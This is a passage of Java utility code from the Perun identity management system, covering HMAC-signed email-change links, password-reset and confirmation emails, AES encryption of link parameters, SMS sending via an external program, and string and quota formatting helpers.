getCombinationsOfLists(lists);\n\n\t\t// join all strings from first list with the others\n\t\tfor (String item: list) {\n\t\t\tif (posibilities.isEmpty()) {\n\t\t\t\tresult.add(item);\n\t\t\t} else {\n\t\t\t\tfor (String itemToConcat : posibilities) {\n\t\t\t\t\tresult.add(item + itemToConcat);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn result;\n\t}\n\n\t/**\n\t * Return encrypted version of input in UTF-8 by HmacSHA256\n\t *\n\t * @param input input to encrypt\n\t * @return encrypted value\n\t */\n\tpublic static String getMessageAuthenticationCode(String input) {\n\n\t\tif (input == null)\n\t\t\tthrow new NullPointerException(\"input must not be null\");\n\t\ttry {\n\t\t\tMac mac = Mac.getInstance(\"HmacSHA256\");\n\t\t\tmac.init(new SecretKeySpec(BeansUtils.getCoreConfig().getMailchangeSecretKey().getBytes(StandardCharsets.UTF_8),\"HmacSHA256\"));\n\t\t\tbyte[] macbytes = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));\n\t\t\treturn new BigInteger(macbytes).toString(Character.MAX_RADIX);\n\t\t} catch (Exception e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\n\t}\n\n\t/**\n\t * Send validation email related to requested change of users preferred email.\n\t *\n\t * @param user user to change preferred email for\n\t * @param url base URL of running perun instance passed from RPC\n\t * @param email new email address to send notification to\n\t * @param changeId ID of change request in DB\n\t * @param subject Template subject or null\n\t * @param content Template message or null\n\t * @throws InternalErrorException\n\t */\n\tpublic static void sendValidationEmail(User user, String url, String email, int changeId, String subject, String content) throws InternalErrorException {\n\n\t\t// create mail sender\n\t\tJavaMailSenderImpl mailSender = new JavaMailSenderImpl();\n\t\tmailSender.setHost(\"localhost\");\n\n\t\t// create message\n\t\tSimpleMailMessage message = new SimpleMailMessage();\n\t\tmessage.setTo(email);\n\t\tmessage.setFrom(BeansUtils.getCoreConfig().getMailchangeBackupFrom());\n\n\t\tString instanceName = BeansUtils.getCoreConfig().getInstanceName();\n\n\t\tif (subject == null ||subject.isEmpty()) {\n\t\t\tmessage.setSubject(\"[\"+instanceName+\"] New email address verification\");\n\t\t} else {\n\t\t\tsubject = subject.replace(\"{instanceName}\", instanceName);\n\t\t\tmessage.setSubject(subject);\n\t\t}\n\n\t\t// get validation link params\n\t\tString i = Integer.toString(changeId, Character.MAX_RADIX);\n\t\tString m = Utils.getMessageAuthenticationCode(i);\n\n\t\ttry {\n\n\t\t\t// !! There is a hard-requirement for Perun instance\n\t\t\t// to host GUI on same server as RPC like: \"serverUrl/gui/\"\n\n\t\t\tURL urlObject = new URL(url);\n\n\t\t\t// use default if unknown rpc path\n\t\t\tString path = \"/gui/\";\n\n\t\t\tif (urlObject.getPath().contains(\"/krb/\")) {\n\t\t\t\tpath = \"/krb/gui/\";\n\t\t\t} else if (urlObject.getPath().contains(\"/fed/\")) {\n\t\t\t\tpath = \"/fed/gui/\";\n\t\t\t} else if (urlObject.getPath().contains(\"/cert/\")) {\n\t\t\t\tpath = \"/cert/gui/\";\n\t\t\t}\n\n\t\t\tStringBuilder link = new StringBuilder();\n\n\t\t\tlink.append(urlObject.getProtocol());\n\t\t\tlink.append(\"://\");\n\t\t\tlink.append(urlObject.getHost());\n\t\t\tlink.append(path);\n\t\t\tlink.append(\"?i=\");\n\t\t\tlink.append(URLEncoder.encode(i, \"UTF-8\"));\n\t\t\tlink.append(\"&m=\");\n\t\t\tlink.append(URLEncoder.encode(m, \"UTF-8\"));\n\t\t\tlink.append(\"&u=\" + user.getId());\n\n\t\t\t// Build message\n\t\t\tString text = \"Dear \"+user.getDisplayName()+\",\\n\\nWe've received request to change your preferred email address to: \"+email+\".\"+\n\t\t\t\t\t\"\\n\\nTo confirm this change please use link below:\\n\\n\"+link+\"\\n\\n\" +\n\t\t\t\t\t\"Message is automatically generated.\" +\n\t\t\t\t\t\"\\n----------------------------------------------------------------\" +\n\t\t\t\t\t\"\\nPerun - Identity & Access Management System\";\n\n\t\t\tif (content == null || content.isEmpty()) {\n\t\t\t\tmessage.setText(text);\n\t\t\t} else {\n\t\t\t\tcontent = content.replace(\"{link}\",link);\n\t\t\t\tmessage.setText(content);\n\t\t\t}\n\n\t\t\tmailSender.send(message);\n\n\t\t} catch (UnsupportedEncodingException ex) {\n\t\t\tthrow new InternalErrorException(\"Unable to encode validation URL for mail change.\", ex);\n\t\t} catch (MalformedURLException ex) {\n\t\t\tthrow new InternalErrorException(\"Not valid URL of running Perun instance.\", ex);\n\t\t}\n\n\t}\n\n\t/**\n\t * Sends email with link to non-authz password reset GUI where user\n\t * can reset forgotten password\n\t *\n\t * @param user user to send notification for\n\t * @param email user's email to send notification to\n\t * @param namespace namespace to reset password in\n\t * @param url base URL of Perun instance\n\t * @param id ID of pwd reset request\n\t * @param messageTemplate message of the email\n\t * @param subject subject of the email\n\t * @throws InternalErrorException\n\t */\n\tpublic static void sendPasswordResetEmail(User user, String email, String namespace, String url, int id, String messageTemplate, String subject) throws InternalErrorException {\n\n\t\t// create mail sender\n\t\tJavaMailSender mailSender = BeansUtils.getDefaultMailSender();\n\n\t\t// create message\n\t\tSimpleMailMessage message = new SimpleMailMessage();\n\t\tmessage.setTo(email);\n\t\tmessage.setFrom(BeansUtils.getCoreConfig().getMailchangeBackupFrom());\n\n\t\tString instanceName = BeansUtils.getCoreConfig().getInstanceName();\n\n\t\tif (subject == null) {\n\t\t\tmessage.setSubject(\"[\" + instanceName + \"] Password reset in namespace: \" + namespace);\n\t\t} else {\n\t\t\tsubject = subject.replace(\"{namespace}\", namespace);\n\t\t\tsubject = subject.replace(\"{instanceName}\", instanceName);\n\t\t\tmessage.setSubject(subject);\n\t\t}\n\n\t\t// get validation link params\n\t\tString i = cipherInput(String.valueOf(user.getId()), false);\n\t\tString m = cipherInput(String.valueOf(id), false);\n\n\t\ttry {\n\n\t\t\tURL urlObject = new URL(url);\n\n\t\t\tStringBuilder link = new StringBuilder();\n\n\t\t\tlink.append(urlObject.getProtocol());\n\t\t\tlink.append(\"://\");\n\t\t\tlink.append(urlObject.getHost());\n\t\t\t// reset link uses non-authz\n\t\t\tlink.append(\"/non/pwd-reset/\");\n\t\t\tlink.append(\"?i=\");\n\t\t\tlink.append(URLEncoder.encode(i, \"UTF-8\"));\n\t\t\tlink.append(\"&m=\");\n\t\t\tlink.append(URLEncoder.encode(m, \"UTF-8\"));\n\t\t\t// append login-namespace so GUI is themes and password checked by namespace rules\n\t\t\tlink.append(\"&login-namespace=\");\n\t\t\tlink.append(URLEncoder.encode(namespace, \"UTF-8\"));\n\n\t\t\t//validity formatting\n\t\t\tString validity = Integer.toString(BeansUtils.getCoreConfig().getPwdresetValidationWindow());\n\t\t\tDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n\t\t\tLocalDateTime localDateTime = LocalDateTime.now().plusHours(Integer.parseInt(validity));\n\t\t\tString validityFormatted = dtf.format(localDateTime);\n\n\t\t\t// Build message en\n\t\t\tString textEn = \"Dear \" + user.getDisplayName() + \",\\n\\nWe've received request to reset your password in namespace \\\"\" + namespace + \"\\\".\" +\n\t\t\t\t\t\"\\n\\nPlease visit the link below, where you can set new password:\\n\\n\" + link + \"\\n\\n\" +\n\t\t\t\t\t\"Link is valid till \" + validityFormatted + \"\\n\\n\" +\n\t\t\t\t\t\"Message is automatically generated.\" +\n\t\t\t\t\t\"\\n----------------------------------------------------------------\" +\n\t\t\t\t\t\"\\nPerun - Identity & Access Management System\";\n\n\n\t\t\tif (messageTemplate == null) {\n\t\t\t\tmessage.setText(textEn);\n\t\t\t} else {\n\n\t\t\t\t// allow enforcing per-language links\n\t\t\t\tif (messageTemplate.contains(\"{link-\")) {\n\t\t\t\t\tPattern pattern = Pattern.compile(\"\\\\{link-[^}]+}\");\n\t\t\t\t\tMatcher matcher = pattern.matcher(messageTemplate);\n\t\t\t\t\twhile (matcher.find()) {\n\n\t\t\t\t\t\t// whole \"{link-something}\"\n\t\t\t\t\t\tString toSubstitute = matcher.group(0);\n\t\t\t\t\t\tString langLink = link.toString();\n\n\t\t\t\t\t\tPattern namespacePattern = Pattern.compile(\"-(.*?)}\");\n\t\t\t\t\t\tMatcher m2 = namespacePattern.matcher(toSubstitute);\n\t\t\t\t\t\tif (m2.find()) {\n\t\t\t\t\t\t\t// only language \"cs\", \"en\",...\n\t\t\t\t\t\t\tString lang = m2.group(1);\n\t\t\t\t\t\t\tlangLink = langLink + \"&locale=\" + lang;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmessageTemplate = messageTemplate.replace(toSubstitute, langLink);\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tmessageTemplate = messageTemplate.replace(\"{link}\", link);\n\t\t\t\t}\n\t\t\t\tmessageTemplate = messageTemplate.replace(\"{displayName}\", user.getDisplayName());\n\t\t\t\tmessageTemplate = messageTemplate.replace(\"{namespace}\", namespace);\n\t\t\t\tmessageTemplate = messageTemplate.replace(\"{validity}\", validityFormatted);\n\t\t\t\tmessage.setText(messageTemplate);\n\t\t\t}\n\n\t\t\tmailSender.send(message);\n\n\t\t} catch (MailException ex) {\n\t\t\tthrow new InternalErrorException(\"Unable to send mail for password reset.\", ex);\n\t\t} catch (UnsupportedEncodingException ex) {\n\t\t\tthrow new InternalErrorException(\"Unable to encode URL for password reset.\", ex);\n\t\t} catch (MalformedURLException ex) {\n\t\t\tthrow new InternalErrorException(\"Not valid URL of running Perun instance.\", ex);\n\t\t}\n\n\t}\n\n\t/**\n\t * Sends email to user confirming his password was changed.\n\t *\n\t * @param user user to send notification for\n\t * @param email user's email to send notification to\n\t * @param namespace namespace the password was re-set\n\t * @param login login of user\n\t * @param subject Subject from template or null\n\t * @param content Message from template or null\n\t */\n\tpublic static void sendPasswordResetConfirmationEmail(User user, String email, String namespace, String login, String subject, String content) {\n\n\t\t// create mail sender\n\t\tJavaMailSender mailSender = BeansUtils.getDefaultMailSender();\n\n\t\t// create message\n\t\tSimpleMailMessage message = new SimpleMailMessage();\n\t\tmessage.setTo(email);\n\t\tmessage.setFrom(BeansUtils.getCoreConfig().getMailchangeBackupFrom());\n\n\t\tString instanceName = BeansUtils.getCoreConfig().getInstanceName();\n\n\t\tif (subject == null || subject.isEmpty()) {\n\t\t\tmessage.setSubject(\"[\"+instanceName+\"] Password reset in namespace: \"+namespace);\n\t\t} else {\n\t\t\tsubject = subject.replace(\"{namespace}\", namespace);\n\t\t\tsubject = subject.replace(\"{instanceName}\", instanceName);\n\t\t\tmessage.setSubject(subject);\n\t\t}\n\n\t\t// Build message\n\t\tString text = \"Dear \"+user.getDisplayName()+\",\\n\\nyour password in namespace \\\"\"+namespace+\"\\\" was successfully reset.\"+\n\t\t\t\t\"\\n\\nThis message is automatically sent to all your email addresses registered in \"+instanceName+\" in order to prevent malicious password reset without your knowledge.\\n\\n\" +\n\t\t\t\t\"If you didn't request / perform password reset, please notify your administrators and support at \"+BeansUtils.getCoreConfig().getMailchangeBackupFrom()+\" to resolve this security issue.\\n\\n\" +\n\t\t\t\t\"Message is automatically generated.\" +\n\t\t\t\t\"\\n----------------------------------------------------------------\" +\n\t\t\t\t\"\\nPerun - Identity & Access Management System\";\n\n\t\tif (content == null || content.isEmpty()) {\n\t\t\tmessage.setText(text);\n\t\t} else {\n\t\t\tcontent = content.replace(\"{displayName}\", user.getDisplayName());\n\t\t\tcontent = content.replace(\"{namespace}\", namespace);\n\t\t\tcontent = content.replace(\"{login}\", login);\n\t\t\tcontent = content.replace(\"{instanceName}\", instanceName);\n\t\t\tmessage.setText(content);\n\t\t}\n\n\t\tmailSender.send(message);\n\n\t}\n\n\t/**\n\t * Return en/decrypted version of input using AES/CBC/PKCS5PADDING cipher.\n\t * Perun's internal secretKey and initVector are used (you can configure them in\n\t * perun.properties file).\n\t *\n\t * @param plainText text to en/decrypt\n\t * @param decrypt TRUE = decrypt input / FALSE = encrypt input\n\t * @return en/decrypted text\n\t * @throws cz.metacentrum.perun.core.api.exceptions.InternalErrorException if anything fails\n\t */\n\tpublic static String cipherInput(String plainText, boolean decrypt) throws InternalErrorException {\n\n\t\ttry {\n\n\t\t\tString encryptionKey = BeansUtils.getCoreConfig().getPwdresetSecretKey();\n\t\t\tString initVector = BeansUtils.getCoreConfig().getPwdresetInitVector();\n\n\t\t\tCipher c = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n\t\t\tSecretKeySpec k = new SecretKeySpec(encryptionKey.getBytes(StandardCharsets.UTF_8), \"AES\");\n\t\t\tc.init((decrypt) ? Cipher.DECRYPT_MODE : Cipher.ENCRYPT_MODE, k, new IvParameterSpec(initVector.getBytes(StandardCharsets.UTF_8)));\n\n\t\t\tif (decrypt) {\n\n\t\t\t\tbyte[] bytes = Base64.decodeBase64(plainText.getBytes(StandardCharsets.UTF_8));\n\t\t\t\treturn new String(c.doFinal(bytes), StandardCharsets.UTF_8);\n\n\t\t\t} else {\n\n\t\t\t\tbyte[] bytes = Base64.encodeBase64(c.doFinal(plainText.getBytes(StandardCharsets.UTF_8)));\n\t\t\t\treturn new String(bytes, StandardCharsets.UTF_8);\n\n\t\t\t}\n\n\t\t} catch (Exception ex) {\n\n\t\t\tthrow new InternalErrorException(\"Error when encrypting message\", ex);\n\n\t\t}\n\n\t}\n\n\t/**\n\t * Checks whether the destination is not null and is of the right type.\n\t *\n\t * @param destination destination to check\n\t * @throws cz.metacentrum.perun.core.api.exceptions.InternalErrorException if destination is null\n\t * @throws cz.metacentrum.perun.core.api.exceptions.WrongPatternException if destination is not of the right type\n\t */\n\tpublic static void checkDestinationType(Destination destination) throws InternalErrorException, WrongPatternException  {\n\t\tif (destination == null) {\n\t\t\tthrow new InternalErrorException(\"Destination is null.\");\n\t\t}\n\t\tString destinationType = destination.getType();\n\t\tif ((!Objects.equals(destinationType, Destination.DESTINATIONHOSTTYPE)\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONEMAILTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONSEMAILTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONURLTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONUSERHOSTTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONUSERHOSTPORTTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONSERVICESPECIFICTYPE))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONWINDOWS))\n\t\t\t\t&& (!Objects.equals(destinationType, Destination.DESTINATIONWINDOWSPROXY)))) {\n\t\t\tthrow new WrongPatternException(\"Destination type \" + destinationType + \" is not supported.\");\n\t\t}\n\t}\n\n\t/**\n\t * Sends SMS to the phone number of a user with the given message.\n\t * The phone number is taken from the user attribute urn:perun:user:attribute-def:def:phone.\n\t *\n\t * @param sess session\n\t * @param user receiver of the message\n\t * @param message sms message to send\n\t * @throws InternalErrorException when the attribute value cannot be found or is broken\n\t * @throws cz.metacentrum.perun.core.api.exceptions.PrivilegeException when the actor has not right to get the attribute\n\t * @throws cz.metacentrum.perun.core.api.exceptions.UserNotExistsException when given user does not exist\n\t */\n\tpublic static void sendSMS(PerunSession sess, User user, String message) throws InternalErrorException, PrivilegeException, UserNotExistsException {\n\t\tif (user == null) {\n\t\t\tthrow new cz.metacentrum.perun.core.api.exceptions.IllegalArgumentException(\"user is null\");\n\t\t}\n\t\tif (message == null) {\n\t\t\tthrow new cz.metacentrum.perun.core.api.exceptions.IllegalArgumentException(\"message is null\");\n\t\t}\n\t\tString telNumber;\n\t\ttry {\n\t\t\ttelNumber = (String) sess.getPerun().getAttributesManager().getAttribute(sess, user, userPhoneAttribute).getValue();\n\t\t} catch (AttributeNotExistsException ex ) {\n\t\t\tlog.error(\"Sendig SMS with text \\\"{}\\\" to user {} failed: cannot get tel. number.\", message, user );\n\t\t\tthrow new InternalErrorException(\"The attribute \" + userPhoneAttribute + \" has not been found.\", ex);\n\t\t} catch (WrongAttributeAssignmentException ex) {\n\t\t\tlog.error(\"Sendig SMS with text \\\"{}\\\" to user {} failed: cannot get tel. number.\", message, user );\n\t\t\tthrow new InternalErrorException(\"The attribute \" + userPhoneAttribute + \" has not been found in user attributes.\", ex);\n\t\t}\n\t\tsendSMS(telNumber, message);\n\t}\n\n\t/**\n\t * Sends SMS to the phone number of a member with the given message.\n\t * The phone number is taken from the user attribute urn:perun:member:attribute-def:def:phone.\n\t *\n\t * @param sess session\n\t * @param member receiver of the message\n\t * @param message sms message to send\n\t * @throws InternalErrorException when the attribute value cannot be found or is broken\n\t * @throws cz.metacentrum.perun.core.api.exceptions.PrivilegeException when the actor has not right to get the attribute\n\t * @throws cz.metacentrum.perun.core.api.exceptions.MemberNotExistsException when given member does not exist\n\t */\n\tpublic static void sendSMS(PerunSession sess, Member member, String message) throws InternalErrorException, PrivilegeException, MemberNotExistsException {\n\t\tString telNumber;\n\t\ttry {\n\t\t\ttelNumber = (String) sess.getPerun().getAttributesManager().getAttribute(sess, member, memberPhoneAttribute).getValue();\n\t\t} catch (AttributeNotExistsException ex) {\n\t\t\tlog.error(\"Sendig SMS with text \\\"{}\\\" to member {} failed: cannot get tel. number.\", message, member );\n\t\t\tthrow new InternalErrorException(\"The attribute \" + memberPhoneAttribute + \" has not been found.\", ex);\n\t\t} catch (WrongAttributeAssignmentException ex) {\n\t\t\tlog.error(\"Sendig SMS with text \\\"{}\\\" to member {} failed: cannot get tel. number.\", message, member );\n\t\t\tthrow new InternalErrorException(\"The attribute \" + memberPhoneAttribute + \" has not been found in user attributes.\", ex);\n\t\t}\n\t\tsendSMS(telNumber, message);\n\t}\n\n\t/**\n\t * Sends SMS to the phone number with the given message.\n\t * The sending provides external program for sending sms.\n\t * Its path is saved in the perun property perun.sms.program.\n\t *\n\t * @param telNumber phone number of the receiver\n\t * @param message sms message to send\n\t * @throws InternalErrorException when there is something wrong with external program\n\t * @throws IllegalArgumentException when the phone or message has a wrong format\n\t */\n\tpublic static void sendSMS(String telNumber, String message) throws InternalErrorException {\n\t\tlog.debug(\"Sending SMS with text \\\"{}\\\" to tel. number {}.\", message, telNumber);\n\n\t\ttry {\n\t\t\t// create properties list\n\t\t\tList<String> processProperties = new ArrayList<>();\n\t\t\t// pass the location of external program for sending sms\n\t\t\tprocessProperties.add(BeansUtils.getCoreConfig().getSmsProgram());\n\t\t\t// pass program options\n\t\t\tprocessProperties.add(\"-p\");\n\t\t\tprocessProperties.add(telNumber);\n\t\t\tprocessProperties.add(\"-m\");\n\t\t\tprocessProperties.add(message);\n\t\t\t// execute\n\t\t\tProcessBuilder pb = new ProcessBuilder(processProperties);\n\t\t\tProcess process;\n\t\t\tprocess = pb.start();\n\t\t\tint exitValue;\n\t\t\ttry {\n\t\t\t\texitValue = process.waitFor();\n\t\t\t} catch (InterruptedException ex) {\n\t\t\t\tString errMsg = \"The external process for sending sms was interrupted.\";\n\t\t\t\tlog.error(\"Sending SMS with text \\\"{}\\\" to tel. number {} failed.\", message, telNumber);\n\t\t\t\tthrow new InternalErrorException(errMsg, ex);\n\t\t\t}\n\n\t\t\t// handle response\n\t\t\tif (exitValue == 0) {\n\t\t\t\t// successful\n\t\t\t\tlog.debug(\"SMS with text \\\"{}\\\" to tel. number {} successfully sent.\", message, telNumber);\n\t\t\t} else if ((exitValue == 1) || (exitValue == 2)) {\n\t\t\t\t// users fault\n\t\t\t\tString errMsg = getStringFromInputStream(process.getErrorStream());\n\t\t\t\tlog.error(\"Sending SMS with text \\\"{}\\\" to tel. number {} failed.\", message, telNumber);\n\t\t\t\tthrow new cz.metacentrum.perun.core.api.exceptions.IllegalArgumentException(errMsg);\n\t\t\t} else if (exitValue > 2) {\n\t\t\t\t// internal fault\n\t\t\t\tString errMsg = getStringFromInputStream(process.getErrorStream());\n\t\t\t\tlog.error(\"Sending SMS with text \\\"{}\\\" to tel. number {} failed.\", message, telNumber);\n\t\t\t\tthrow new InternalErrorException(errMsg);\n\t\t\t}\n\n\t\t} catch (IOException ex) {\n\t\t\tlog.warn(\"Sending SMS with text \\\"{}\\\" to tel. number {} failed.\", message, telNumber);\n\t\t\tthrow new InternalErrorException(\"Cannot access the sms external application.\", ex);\n\t\t}\n\n\t}\n\n\t/**\n\t * Get BigDecimal number like '1024' in Bytes and create better readable\n\t * String with metric value like '1K' where K means KiloBytes.\n\t *\n\t * Use M,G,T,P,E like multipliers of 1024.\n\t *\n\t * If quota is not dividable by 1024 use B (Bytes) without dividing.\n\t *\n\t * @param quota in big natural number\n\t * @return string with number and metric\n\t */\n\tpublic static String bigDecimalBytesToReadableStringWithMetric(BigDecimal quota) throws InternalErrorException {\n\t\tif(quota == null) throw new InternalErrorException(\"Quota in BigDecimal can't be null if we want to convert it to number with metric.\");\n\t\t//Prepare variable for result\n\t\tString stringWithMetric;\n\t\t//Try to divide quota to get result module 1024^x = 0 where X is in [K-0,M-1,G-2,T-3,P-4,E-5]\n\t\t//If module is bigger than 0, try x-1\n\t\tif(!quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.E)).stripTrailingZeros().toPlainString().contains(\".\")) {\n\t\t\t//divide by 1024^5\n\t\t\tstringWithMetric = quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.E)).stripTrailingZeros().toPlainString() + \"E\";\n\t\t} else if(!quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.P)).stripTrailingZeros().toPlainString().contains(\".\")) {\n\t\t\t//divide by 1024^4\n\t\t\tstringWithMetric = quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.P)).stripTrailingZeros().toPlainString() + \"P\";\n\t\t} else if(!quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.T)).stripTrailingZeros().toPlainString().contains(\".\")) {\n\t\t\t//divide by 1024^3\n\t\t\tstringWithMetric = quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.T)).stripTrailingZeros().toPlainString() + \"T\";\n\t\t} else if(!quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.G)).stripTrailingZeros().toPlainString().contains(\".\")) {\n\t\t\t//divide by 1024^2\n\t\t\tstringWithMetric = quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.G)).stripTrailingZeros().toPlainString() + \"G\";\n\t\t} else if(!quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.M)).stripTrailingZeros().toPlainString().contains(\".\")) {\n\t\t\t//divide by 1024^1\n\t\t\tstringWithMetric = quota.divide(BigDecimal.valueOf(ModulesUtilsBlImpl.M)).stripTrailingZeros().toPlainString() + \"M\";\n\t\t} else {\n\t\t\t//can't be diveded by 1024^x where x>0 so let it be in the format like it already is, convert it to BigInteger without fractional part\n\t\t\tstringWithMetric = quota.toBigInteger().toString() + \"K\";\n\t\t}\n\t\t//return result format with metric\n\t\treturn stringWithMetric;\n\t}\n\n\tprivate static String getStringFromInputStream(InputStream is) throws IOException {\n\t\tBufferedReader reader = new BufferedReader(new InputStreamReader(is));\n\t\tStringBuilder out = new StringBuilder();\n\t\tString line;\n\t\twhile ((line = reader.readLine()) != null) {\n\t\t\tout.append(line);\n\t\t}\n\t\treturn out.toString();\n\t}\n\n\t/**\n\t * IMPORTANT: this method not convert utf to ascii, just try to convert some problematic\n\t * chars to UTF and others change to '?'!!!\n\t *\n\t * @param s\n\t * @return converted string from ascii to something near utf\n\t */\n\tpublic synchronized static String utftoasci(String s){\n\t\tfinal StringBuilder sb = new StringBuilder( s.length() * 2 );\n\n\t\tfinal StringCharacterIterator iterator = new StringCharacterIterator( s );\n\n\t\tchar ch = iterator.current();\n\n\t\twhile( ch != StringCharacterIterator.DONE ){\n\t\t\tif(Character.getNumericValue(ch)>=0){\n\t\t\t\tsb.append( ch );\n\t\t\t}else{\n\t\t\t\tboolean f=false;\n\t\t\t\tif(Character.toString(ch).equals(\"Ê\")){sb.append(\"E\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"È\")){sb.append(\"E\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ë\")){sb.append(\"e\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"é\")){sb.append(\"e\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"è\")){sb.append(\"e\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Â\")){sb.append(\"A\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ä\")){sb.append(\"a\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ß\")){sb.append(\"ss\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ç\")){sb.append(\"C\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ö\")){sb.append(\"O\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"º\")){sb.append(\"\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ª\")){sb.append(\"\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"º\")){sb.append(\"\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ñ\")){sb.append(\"N\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"É\")){sb.append(\"E\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ä\")){sb.append(\"A\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Å\")){sb.append(\"A\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ü\")){sb.append(\"U\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ö\")){sb.append(\"o\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ü\")){sb.append(\"u\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"á\")){sb.append(\"a\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ó\")){sb.append(\"O\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ě\")){sb.append(\"e\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ě\")){sb.append(\"E\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"š\")){sb.append(\"s\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Š\")){sb.append(\"S\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"č\")){sb.append(\"c\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Č\")){sb.append(\"C\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ř\")){sb.append(\"r\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ř\")){sb.append(\"R\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ž\")){sb.append(\"z\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ž\")){sb.append(\"Z\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ý\")){sb.append(\"y\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ý\")){sb.append(\"Y\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"í\")){sb.append(\"i\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Í\")){sb.append(\"I\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ó\")){sb.append(\"o\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ú\")){sb.append(\"u\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ú\")){sb.append(\"u\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ů\")){sb.append(\"u\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ů\")){sb.append(\"U\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ň\")){sb.append(\"N\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ň\")){sb.append(\"n\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"Ť\")){sb.append(\"T\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\"ť\")){sb.append(\"t\");f=true;}\n\t\t\t\tif(Character.toString(ch).equals(\" \")){sb.append(\" \");f=true;}\n\n\t\t\t\tif(!f){\n\t\t\t\t\tsb.append(\"?\");\n\t\t\t\t}\n\t\t\t}\n\t\t\tch = iterator.next();\n\t\t}\n\t\treturn sb.toString();\n\t}\n\n\t/**\n\t * Convert input string (expected UTF-8) to ASCII if possible.\n\t * Any non-ASCII character is replaced by replacement parameter.\n\t *\n\t * @param input String to convert from UTF-8 to ASCII.\n\t * @param replacement Replacement character used for all non-ASCII chars in input.\n\t * @return converted string from ascii to something near utf\n\t */\n\tpublic synchronized static String toASCII(String input, Character replacement) {\n\n\t\tString normalizedOutput = \"\";\n\n\t\t// take unicode characters one by one and normalize them\n\t\tfor ( int i=0; i<input.length(); i++ ) {\n\t\t\tchar c = input.charAt(i);\n\t\t\t// normalize a single unicode character, then remove every non-ascii symbol (like accents)\n\t\t\tString normalizedChar = Normalizer.normalize(String.valueOf(c) , Normalizer.Form.NFD).replaceAll(\"[^\\\\p{ASCII}]\", \"\");\n\n\t\t\tif ( ! normalizedChar.isEmpty() ) {\n\t\t\t\t// if there is a valid ascii representation, use it\n\t\t\t\tnormalizedOutput += normalizedChar;\n\t\t\t} else {\n\t\t\t\t// otherwise replace character with an \"replacement\"\n\t\t\t\tnormalizedOutput += replacement;\n\t\t\t}\n\t\t}\n\t\treturn normalizedOutput;\n\n\t}\n\n\t/**\n\t * Determine if attribute is large (can contain value over 4kb).\n\t *\n\t * @param sess perun session\n\t * @param attribute attribute to be checked\n\t * @return true if the attribute is large\n\t */\n\tpublic static boolean isLargeAttribute(PerunSession sess, AttributeDefinition attribute) {\n\t\treturn (attribute.getType().equals(LinkedHashMap.class.getName()) 